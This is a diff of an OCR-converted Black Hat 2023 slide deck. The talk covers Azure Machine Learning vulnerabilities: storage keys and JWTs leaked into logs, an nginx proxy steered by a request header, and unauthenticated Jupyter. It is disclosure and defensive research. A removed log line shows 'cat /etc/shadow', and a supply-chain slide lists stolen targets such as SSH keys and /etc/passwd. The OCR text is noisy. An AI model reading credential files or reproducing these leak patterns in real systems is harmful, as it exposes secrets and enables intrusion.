@@ -8,12 +8,18 @@ year: 2023
 source_pdf: "Black Hat USA 2023 slides/Nitesh Surana & Magno Logan & David Fiser_Uncovering Azure's Silent Threats A Journey into Cloud Vulnerabilities.pdf"
 pages: 98
 sha256: "5a8abe36b149ea82b8287b66eabc18e00b2373545bc073c43ed8d91442620301"
-text_chars: 37211
-ocr_pages: 57
+text_chars: 32020
+ocr_pages: 42
 has_ocr: true
+redacted_secrets: 0
+ocr_confidence: 87.0
+ocr_unreliable_blocks: 0
+vision_verified_blocks: 1
+ocr_timeouts: 0
+pages_recovered_from_text_layer: 0
 companion_files: []
 extractor: "pymupdf4llm 1.28.2 + tesseract"
-converted_at: "2026-08-11T21:23:12Z"
+converted_at: "2026-08-12T04:19:38Z"
 ---
 # Uncovering Azure's Silent Threats A Journey into Cloud Vulnerabilities
 
@@ -21,14 +27,15 @@ converted_at: "2026-08-11T21:23:12Z"
 **Conference:** Black Hat USA 2023  
 **Source:** `Black Hat USA 2023 slides/Nitesh Surana & Magno Logan & David Fiser_Uncovering Azure's Silent Threats A Journey into Cloud Vulnerabilities.pdf` (98 pages)
 
+
 ## Slide 1
 
 ### Uncovering Azure's Silent Threats: A Journey into Cloud Vulnerabilities
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 86/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-pifek hat
 USA &
 AUGUST 9-10, ©0253
 BRIEFINGS
@@ -71,27 +78,14 @@ Previously @ SOC, Threat Hunting/Intel, VDPs Socials: https://linktr.ee/niteshsu
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-pifeK hat
-USA 20e53
-jupyter
-@
-CH 0: Introduction
-#BHUSA @BlackHatEvents
-```
-
 ## Slide 5
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 90/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-2)
-blackhat One, gy ae.
-USA 2025 ~~ —_—oa
 Update on the vulnerability in the Azure Cosmos
 A DB Jupyter Notebook |Feature
 Microsoft Mitigates Vulnerability in Jupyter
@@ -101,7 +95,6 @@ December O02, 2021
 AS AWS SageMaker |Jupyter Notebook
 eee! Instance Takeover
 éy Cookie Tossing to RCE on Google Cloud JupyterLab
-#BHUSA @BlackHatEvents
 ```
 
 ## Slide 6
@@ -110,18 +103,16 @@ eee! Instance Takeover
 
 Azure Machine Learning
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 93/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 20e53
 / jupyter
 All Marketplace (31) Documentation (99+)
 Resource Groups (0)
 Documentation
 Run Jupyter notebooks in your workspace - Azure Machine Learni...
 Azure Machine Learning
-#BHUSA @BlackHatEvents
 ```
 
 ## Slide 7
@@ -134,16 +125,14 @@ Source: Gartner
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 87/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 20e53
 And you can use Azure Machine Learnin
-> pl  ) = 12:20/16:27 - Use Al supercomputer infrastructure for your workloads >
+> pl ) = 12:20/16:27 - Use Al supercomputer infrastructure for your workloads >
 What runs ChatGPT? Inside Microsoft's Al supercomputer | Featuring Mark
 Russinovich
-#BHUSA @BlackHatEvents
 ```
 
 ## Slide 8
@@ -168,17 +157,15 @@ Accessing Workspace using AML Studio (https://ml.azure.com/)
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 86/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-si 5 research_tenant 2,
 Azure Al | Machine Learning Studio © a 8 a ? © zi = Vv Or
 lema ,
 < All workspaces d e aa re) 4 ++ New v == Customize view
 | © Home
-Fig hecciel cateiog, menew Notebook samples -~ View all
 Authoring Get started: Train and deploy Distributed GPU training = = Automate with Pipelines
-=e
 4 a model o Run a sample multi-GPU image == Create a production pipeline for a
 El Notebooks Train and deploy a sample image classification experiment. credit default prediction sample.
 lassification model.
@@ -196,7 +183,6 @@ cloud development. your training script, notebook, or files, public URLs, or Ope
 @> Endpoints .
 Recently viewed ~~ View all
 Accessing Workspace using AML Studio (https://ml.azure.com/)
-#BHUSA @BlackHatEvents
 ```
 
 ## Slide 11
@@ -214,18 +200,6 @@ Container Registry* App Insights
 *optional
 
 #BHUSA @BlackHatEvents
-
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-bisek hat
-USA 20e53
-Storage Account Key Vault
-re —_
-Workspace Gs *
-\ Container 8 App insights /
-are) pti ional #BHUSA @BlackHatEvents
-```
 
 ## Slide 12
 
@@ -288,24 +262,17 @@ Datastores mapped to File Shares and Blob Storage of Workspace
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 80/100 on the text kept, 71/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-pisekhat Datastore Overview <~
-USA 20e53
-\” [BD Blob Containers
-Name Il xx Type MM Slogs
-i azureml
 workspaceartifactstore Azure Blob Storage - azureml|-blobstore-90092ee
-ll insights-logs-auditevent
 workspaceworkingdirectory Azure file share Mi insights-metrics-ptim
 Vv = File Shares
 workspacefilestore Azure file share - azureml-filestore-90092eee-
-eM code-391ff5ac-6576-460f-bz
 workspaceblobstore (Default) Azure Blob Storage Mi Queues
 > [HE Tables
 Datastores mapped to File Shares and Blob Storage of Workspace
-#BHUSA @BlackHatEvents
 ```
 
 ## Slide 17
@@ -323,22 +290,15 @@ Users Compute Instances Workspace
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 84/100 on the text kept, 61/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 20e53
-A
 AR
-ona
 6)
-(81)
 e
 File Share
-ee
-¥ re
 Users Compute Instances Workspace
-#BHUSA @BlackHatEvents
 ```
 
 ## Slide 19
@@ -347,34 +307,20 @@ Users Compute Instances Workspace
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-bisek hat
-USA 20e53
-CH 1: Did you see my keys?
-#BHUSA @BlackHatEvents
-```
-
 ## Slide 20
 
 #### Directories in Compute Instance
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 86/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-2)
-black hat
-USA 20e53
-a)
 > +
 Directories in Compute Inst: r
 Esl 1:mybox x
 »
-sall4
-E98
 azureuser@mybox: /mnt/batchs cd tasks/
 azureuser@mybox: /mnt/batch/tasks$
 1s
@@ -385,10 +331,7 @@ total 32
 drwxrwx--- 8 azbatch azbatchgrp
 drwxr-xr-x 4 root root
 drwxrwx--—— 2 azbatch azbatchgrp
-drwxrwx--- 2 azbatch  azbatchgrp
-drwxrwx--- 3  azbatch azbatchgrp
-drwxrwx--- 4 azbatch  azbatchgrp
-drwxrwx--- 3  azbatch azbatchgrp
+drwxrwx--- 2 azbatch azbatchgrp
 drwxrwx--- 2 azbatch azbatchgrp
 azureuser@mybox: /mnt/batch/tasks$
 4096
@@ -424,14 +367,12 @@ Jul
 10:02
 10:02
 .
--_f©
 applications
 fsmounts
 shared
 startup
 volatile
 workitems
-#BHUSA @BlackHatEvents
 ```
 
 ## Slide 21
@@ -477,19 +418,15 @@ Compute Instance
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 83/100 on the text kept, 76/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 20e53
 @
 mounted on
-5
-@
 File Share Compute Instance
 2022/08/18 69:18:39|Running following command: /usr/bin/sudo mount -t cifs //niteshamlws5927017212| f
 2022/08/18 @9:18:39|Running following command: /usr/bin/sudo mount -t cifs //niteshamlws5927017212|f
-#BHUSA @BlackHatEvents
 ```
 
 ## Slide 24
@@ -506,14 +443,6 @@ File Share Compute Instance
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-bisek hat
-USA 20e53
-#BHUSA @BlackHatEvents
-```
-
 ## Slide 26
 
 #### Fix: Access Key masked
@@ -522,31 +451,20 @@ Fix: Masked Storage Account Access Key in Batch error logs
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 85/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 bisekhat Fix: Access Key maske fA
-USA 20e53
 2022/09/27 @8:08:30 Running following command: /usr/bin/sudo mo
-niteshamlws425015195@. file. core.windows.net/code-391ff5ac-6576-:
-batch/tasks/shared/LS_ root/mounts/clusters/aml2/code -o vers=3.|
 username=niteshamlws425015195@ ,|password=*************) dir mode=
 serverino
 Fix: Masked Storage Account Access Key in Batch error logs
-#BHUSA @BlackHatEvents
 ```
 
 ## Slide 27
 
 #BHUSA @BlackHatEvents
-
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-bisek hat
-USA 20e53
-#BHUSA @BlackHatEvents
-```
 
 ## Slide 28
 
@@ -584,17 +502,16 @@ Source: mount.cifs(8) - Linux man page
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 89/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 pisekhat Key passed 45 an env. varic i
-USA 20e53
 password=arg
 specifies the CIFS password. If this option is not given then] the environment variable PASSWD is used.
 If the password is not specified directly or indirectly via an argument to mount, mount.cifs will prompt
 for a password, unless the guest option is specified.
 Source: mount.cifs(8) - Linux man page
-#BHUSA @BlackHatEvents
 ```
 
 ## Slide 31
@@ -602,15 +519,6 @@ Source: mount.cifs(8) - Linux man page
 ###### CH 2: Wait, is that my token?
 
 #BHUSA @BlackHatEvents
-
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-bisek hat
-USA 20e53
-CH 2: Wait, is that my token?
-#BHUSA @BlackHatEvents
-```
 
 ## Slide 32
 
@@ -628,26 +536,17 @@ e.g. JupyterLab URL - https://aml.eastasia.instances.azureml.ms/lab
 
 ###### Access Compute Instance using JupyterLab
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 84/100 on the text kept, 67/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 20e53
-¢- Cc
-oan
 ~ File Edit View Run
-"EG: :
-gc Name
-B® Users
-O a 3 https://mybox.eastasia.instances.azureml.ms/lab
 Kernel Tabs Settings Help
 Cc 3 azureuser@mybox: /mnt/bat X
-Q azureuser@mybox: /mnt/batch/tasks/shared/LS_root/mounts/clusters/mybox/ code} (]
 Last Modified
 6 days ago
 Hi J
 Access Compute Instance using JupyterLab
-#BHUSA @BlackHatEvents
 ```
 
 ## Slide 34
@@ -656,24 +555,19 @@ Access Compute Instance using browser-embedded Terminal
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 82/100 on the text kept, 71/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 20e53
 Azure Al | Machine Learning Studio
-Authoring ae a “eo = => demo > Notebooks
 =| Notebooks _
 [] 1:mybox x
 fe Automated ML
-sa Designer —_ =? &
 » .
 Assets azureuser@mybox:~S whoami
-7 azureuser
 2 BENE a azureuser@mybox:~$ sudo su
 A Jobs 2 root@mybox: /home/azureuser# L
 Access Compute Instance using browser-embedded Terminal
-#BHUSA @BlackHatEvents
 ```
 
 ## Slide 35
@@ -696,15 +590,12 @@ nginx config of the Compute Instance
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 84/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 20e53
 listen 44224 ssl \default_server;
-server_name dsvm.local;
 ssl_certificate /mnt/batch/tasks/startup/certs/shal-c552de288f946fc143edd721a5b03a2@bbdf504b. pem;
-ssl_certificate_key /mnt/batch/tasks/startup/certs/sha1-c552de288f946fc143edd721a5b@3a2@bbdf504b. key;
 if |($i_cn|!~ "*DigiCert SHA2 Secure Server CA$|*DigiCert SHA2 Secure Server CA$") {
 return 401;
 }
@@ -712,7 +603,6 @@ if |($s_cn| != eastasia.identity.notebooks.azureml.net)) {
 | return 401;
 }
 nginx config of the Compute Instance
-#BHUSA @BlackHatEvents
 ```
 
 ## Slide 37
@@ -721,11 +611,10 @@ nginx config of the Compute Instance
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 83/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 20e53
 if ($http_x_ms_target_port ~ *[@-9]+$) {
 set $proxyhost 127.0.0.1:$http_x_ms_target_port; (umm
 }
@@ -744,7 +633,6 @@ proxy_read_timeout 86400 ;
 location / {
 proxy_pass http: //$proxyhost ; (mmm nginx config of the Compute Instance
 proxy_set_header Host $http_x_forwarded_host;
-#BHUSA @BlackHatEvents
 ```
 
 ## Slide 38
@@ -757,20 +645,16 @@ proxy_set_header Host $http_x_forwarded_host;
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 81/100 on the text kept, 71/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-USA 20e53
 GET /terminals/websocket/2?token=eyJ@eXAi0iJ... HTTP/1.1
 Host: aml.eastasia.instances.azureml.ms
 X-MS-Target-Port: 8888
 127.0.0.1:8888
 0.0.0.0:44224
 > NGINX >
-am
-—
-/var/log/nginx/{access, error}.log
-#BHUSA @BlackHatEvents
 ```
 
 ## Slide 39
@@ -779,19 +663,16 @@ am
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 84/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 pisekhat JWT logged in nginx access log
-USA 20e53
 1:mybox x —_
 G92 © Compute: | mybox - Runni
-qing terminal
 Terminate running processes? Xx
 Closing this tab will terminate all the running processes.
-"GET /terminals/websocket/2?token=eyJ@eXAi0i JKV1QiL(
 “DELETE /api/terminals/2 HTTP/1.1" 204 @ "-" "™"
-#BHUSA @BlackHatEvents
 ```
 
 ## Slide 40
@@ -799,22 +680,6 @@ Closing this tab will terminate all the running processes.
 Decode JWT to view the AML token
 
 #BHUSA @BlackHatEvents
-
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-pifeK hat
-USA 20e53
-ty bocce.
-“sig: 6UC™RM
-“aot”: “2a nist SAvVEVEexE3i6100T0I".
-“wie”: “Zp ) Wipe AYE VGeRE DSi veTOr”
-».4
-mmm "aud": "https: //management.core.windows.net/",
-"iss": "https: //sts .windows . net /\iige” irae” Site earn”
-Decode JWT to view the AML token
-#BHUSA @BlackHatEvents
-```
 
 ## Slide 41
 
@@ -824,18 +689,16 @@ Jupyter server can receive token in URL parameter (Source: Jupyter Docs)
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 89/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 pi&tkhat JWT token in URL parameter
-USA 20e53
 e inthe Authorization header, e.g.:
 Authorization: token abcdef...
 e |In a URL parameter, e.g.:
-https: //my-server/tree/?token=abcdef...
 e In the password field of the login form that will be shown to you if you are not logged in.
 Jupyter server can receive token in URL parameter (Source: Jupyter Docs)
-#BHUSA @BlackHatEvents
 ```
 
 ## Slide 42
@@ -844,34 +707,22 @@ Jupyter server can receive token in URL parameter (Source: Jupyter Docs)
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-pifeK hat
-USA 20e53
-What could go wrong?
-#BHUSA @BlackHatEvents
-```
-
 ## Slide 43
 
 Error logs being shared on public platforms like GitHub
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 94/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 20e53
 cluster to 0 and back to 2.
-et en
 stderr.txt
 Thanks for reporting the problem. can you please provide stdout.txt and
 /mnt/batch/tasks/startup/ for investigation? You can solve the problem by resizing the
 Error logs being shared on public platforms like GitHub
 from
-#BHUSA @BlackHatEvents
 ```
 
 ## Slide 44
@@ -880,26 +731,19 @@ from
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 89/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 piSekhat Supply Chain Attack in Depender
-USA 20e53
 PyTorch discloses malicious dependency chain
 compromise over holidays
 By Ax Sharma
-nameservers from ~/etc/resolv. conf
-hostname from ~ gethostname()*
 current username from ~getlogin()~
 current working directory name from ~ getcwd()”
 environment variables
-~fetc/hosts”
-* fetc/passwd
 the first 1000 files in the user's ~$Home~ directory
-~$HOME/.gitconfig-
-~ $HOME/.ssh/*.~
 January 1, 2023
-#BHUSA @BlackHatEvents
 ```
 
 ## Slide 45
@@ -918,24 +762,18 @@ Blob Container
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 85/100 on the text kept, 71/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 20e53
 Jupyter Notebooks
-2 5
-™
 5 °
 File Share
 Storage Account =.
 Blob Container
 Datasets (G0) =| Logs
-Nye
-ea
 Models =. Snapshots
 Python Scripts
-#BHUSA @BlackHatEvents
 ```
 
 ## Slide 46
@@ -945,22 +783,13 @@ Users Compute Instances Workspace
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 79/100 on the text kept, 62/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 20e53
-OC)
 an
-5
-0)
-an
-0)
-@
 File Share
-en r
 Users \ compu Instances workspace /
-#BHUSA @BlackHatEvents
 ```
 
 ## Slide 47
@@ -970,21 +799,13 @@ Users Compute Instances Workspace
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 79/100 on the text kept, 60/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 20e53
-OC)
 an
-C) _
-©) _
-(81)
-@
 File Share
-en r
 Users \ compu Instances workspace /
-#BHUSA @BlackHatEvents
 ```
 
 ## Slide 48
@@ -994,20 +815,13 @@ Users Compute Instances Workspace
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 79/100 on the text kept, 61/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 20e53
-OC)
 an
-C) _
-©) _
-(81)
 File Share
-(81)
 Users \ compu Instances workspace /
-#BHUSA @BlackHatEvents
 ```
 
 ## Slide 49
@@ -1017,14 +831,12 @@ Users Compute Instances Workspace
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 85/100 on the text kept, 73/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 20e53
 File Share
 Users \ comput Instances workspace /
-#BHUSA @BlackHatEvents
 ```
 
 ## Slide 50
@@ -1033,11 +845,10 @@ Source: MS Docs
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 94/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 20e53
 An Azure Machine Learning datastore is a reference to an existing storage account on Azure. A
 datastore offers these benefits:
 1. A common and easy-to-use API, to interact with different storage types (Blob/Files/Azure
@@ -1046,7 +857,6 @@ Data Lake Storage) and authentication methods.
 ir your scripts, a way to hide connection information for credential-based data access
 service principal/SAS/key).
 Source: MS Docs
-#BHUSA @BlackHatEvents
 ```
 
 ## Slide 51
@@ -1054,15 +864,6 @@ Source: MS Docs
 Access Keys stored in cleartext (x4 instances)
 
 #BHUSA @BlackHatEvents
-
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-pifeK hat
-USA 20e53
-Access Keys stored in cleartext (x4 instances)
-#BHUSA @BlackHatEvents
-```
 
 ## Slide 52
 
@@ -1072,21 +873,18 @@ Fixed
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 91/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 20e53
 Azure Machine Learning Compute Instance Information Disclosure Vulnerability
 CVE-2023-23382
 Security Vulnerability
 Released: Feb 14, 2023 Last updated: Apr 14, 2023
 Assigning CNA: © = Microsoft v Fixed
-CVE-2023-23382 &
 Impact: Information Disclosure Max Severity: Important
 CVSS:3.16.5/5.7 ©
 https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-23382
-#BHUSA @BlackHatEvents
 ```
 
 ## Slide 53
@@ -1117,11 +915,10 @@ https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-23382
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 91/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 20e53
 Create compute instance
 © Required Settings @ _) Enable idle shutdown ©
 @ Advanced Settings
@@ -1132,11 +929,8 @@ fF Add schedule
 Use this to create the compute within an existing
 virtual network. Learn more about how to enable
 virtual network for compute instances.
-== vnet-amI-bugtest (nitesh-rg)
 © Refresh virtual networks
 Subnet
-mE | default
-#BHUSA @BlackHatEvents
 ```
 
 ## Slide 56
@@ -1148,17 +942,6 @@ Virtual Machine
 Compute Instance
 
 #BHUSA @BlackHatEvents
-
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-bisek hat
-USA 20e53
-io ~
-vNet
-\ Mitual Machine Compute instance
-#BHUSA @BlackHatEvents
-```
 
 ## Slide 57
 
@@ -1249,35 +1032,11 @@ Compute Instance
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-bisek hat
-USA 20e53
-‘qe
-eS
-vNet
-Virtual Machine
-Information Disclosure
-py
-Compute Instance
-#BHUSA @BlackHatEvents
-```
-
 ## Slide 64
 
 ###### How bad could it be?
 
 #BHUSA @BlackHatEvents
-
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-bisek hat
-USA 20e53
-How bad could it be?
-#BHUSA @BlackHatEvents
-```
 
 ## Slide 65
 
@@ -1285,14 +1044,12 @@ How bad could it be?
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 90/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-pifeK hat
-USA 20e53
 jupyter.service loaded |lactive running
 Jupyter installed as a systemd service
-#BHUSA @BlackHatEvents
 ```
 
 ## Slide 66
@@ -1301,85 +1058,63 @@ Jupyter installed as a systemd service
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Read by a vision model from the page image (replacing unreliable OCR) — confidence 86/100 on the text kept, 85/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**
 
 ```text
-<>
-bisekhat Jupyter Service Logs
-USA 20e53
-- Logs begin at Fri 2022-08-19 18:16:10 UTC, end at Mon 2022-10-31 19:40:53 UTC.
-31 19:40:46 zdiamltest sudo[11506]: pam_unix(sudo:session): session closed for user root
-31 19:40:46 zdiamltest sudo[11506]: pam_unix(sudo:session): session opened for user root by (uid=@)
-31 19:40:46 zdiamltest sudo[11506]: azureuser : TTY=pts/@ ; PWO=/mnt/batch/tasks/shared/LS_root/mounts/clusters/zdiamltest/code/Users/nitesh_surana ; USER=root ;] COMMAND=/usr/bin/cat /etc/shadow
-31 19:40:38 zdiamltest jupyter[818@]: [I 2022-10-31 19:40:38.466 ServerApp] New terminal with automatic name: 2
-31 19:40:38 zdiamltest jupyter[8180]: [W 2022-10-31 19:40:38.151 ServerApp] 404 GET /api/terminals/10@0000 (127.0.0.1) 2.47ms referer=None
-31 19:40:38 zdiamltest jupyter[8180]: [W 2022-10-31 19:40:38.15@ ServerApp] Terminal not found: 1000000
-31 19:40:38 zdiamltest jupyter[8180]: [W 2022-10-31 19:40:38.149 ServerApp] 404 GET /api/terminals/10@0000 (127.@.0.1): Terminal not found: 1¢@@00e
-31 19:38:37 zdiamltest jupyter[8180]: [I 2022-10-31 19:38:37.193 ServerApp] New terminal with automatic name: 1 ;
-31 19:38:36 zdiamltest jupyter[8180]: [W 2022-10-31 19:38:36.648 ServerApp] 404 GET /api/terminals/100000@ (127.@.0.1) 3.25ms referer=None oS
-31 19:38:36 zdiamltest jupyter[8180]: [W 2022-10-31 19:38:36.648 ServerApp] Terminal not found: 1000000
-31 19:38:36 zdiamltest jupyter[8180]: [W 2022-10-31 19:38:36.647 ServerApp] 404 GET /api/terminals/10@0000 (127.0.0.1): Terminal not found: 1¢e¢00e00
-31 19:38:03 zdiamltest jupyter[8180]: 2022-10-31 19:38:03.507 ServerApp] Use Control-C to stop this server and shut down all kernels (twice to skip confirmation).
-31 19:38:03 zdiamltest jupyter[8180]: 2022-10-31 19:38:03.507 ServerApp] or http://127.0.0.1:8888/
-31 19:38:03 zdiamltest jupyter[8180]:
-31 2:38:03 zdiamltest jupyter[818e
-31 19:38:03 zdiamltest jupyter[8180]:
-31 19:38:02 zdiamltest jupyter[8180]:
-31 238:02 zdiamltest jupyter[8180
-31 2:38:02 zdiamltest jupyter[8180]:
-31 2:38:02 zdiamltest jupyter[8180
-31 2:38:02 zdiamltest jupyter[8180
-2022-10-31 19:38:03.506 ServerApp] Jupyter Server 1.18.1 is running at:
-2022-10-31 19:38:03.506 ServerApp] Serving notebooks from local directory: /mnt/batch/tasks/shared/LS_root/mounts/clusters/zdiamltest/code
-2022-10-31 19:38:03.505 ServerApp] nbdime | extension was successfully loaded.
-2022-10-31 19:38:02.810 ServerApp] nbclassic extension was successfully loaded.
-2022-10-31 19:38:02.776 ServerApp] jupytext | extension was successfully loaded.
-2022-10-31 19:38:02.774 ServerApp] [Jupytext Server Extension] Deriving a JupytextContentsManager from LargeFileManager
-2022-10-31 19:38:02.774 ServerApp] jupyterlab_nvdashboard | extension failed loading with message: ‘NoneType’ object is not callable
-2022-10-31 19:38:02.773 ServerApp] jupyterlab | extension was successfully loaded.
-31 7:38:02 zdiamltest jupyter[8180]: 2022-10-31 19:38:02.768 LabApp] JupyterLab application directory is /anaconda/envs/azureml_py38/share/jupyter/lab
-31 2:38:02 zdiamltest jupyter[8180]: 2022-10-31 19:38:02.76@ LabApp] JupyterLab extension loaded from /anaconda/envs/azureml_py38/1lib/python3.8/site-packages/jupyterlab
-31 19:38:02 zdiamltest jupyter[81380]: 2022-10-31 19:38:02.758 ServerApp] jupyter_server_proxy | extension failed loading with message: (Pillow 6.2.1 (/anaconda/envs/azureml_py38/lib/python3.8/site-packages
-Requirement .parse(‘pillow>=7.1.0'), {‘bokeh'})
-31 19:38:01 zdiamltest jupyter[8180]: [I 2022-10-31 19:38:01.866 ServerApp] jupyter_server_mathjax | extension was successfully loaded.
-31 19:38:01 zdiamltest jupyter[8180]: [I 2022-10-31 19:38:01.865 ServerApp] jupyter_resource_usage | extension was successfully loaded.
-31 19:38:01 zdiamltest jupyter[8180]: 2022-10-31 19:38:01.864 ServerApp] azureml-samples.handlers | extension was successfully loaded
-31 19:38:01 zdiamltest jupyter[381380]: 2022-10-31 19:38:01.862 ServerApp] notebook_shim | extension was successfully loaded.
-31 738:01 zdiamltest jupyter[8180]: 2022-10-31 19:38:61.86@ ServerApp] All authentication is disabled. Anyone who can connect to this server will be able to run code
